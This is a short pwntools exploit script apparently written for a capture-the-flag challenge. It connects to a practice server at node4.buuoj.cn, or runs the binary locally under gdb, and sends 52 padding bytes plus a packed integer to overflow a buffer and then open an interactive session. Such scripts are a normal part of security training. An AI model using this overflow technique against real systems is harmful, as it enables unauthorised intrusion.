from pwn import *

context.binary = exe = ELF("./9")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                    b*main+105
                    c
                    ''')
    else:
        r = remote("node4.buuoj.cn", 28617)

    return r
def main():
    r = conn()
    r.sendlineafter(b"name?\n", b'a' * 52 + p32(17))
    
    r.interactive()
    
if __name__ == "__main__":
    main()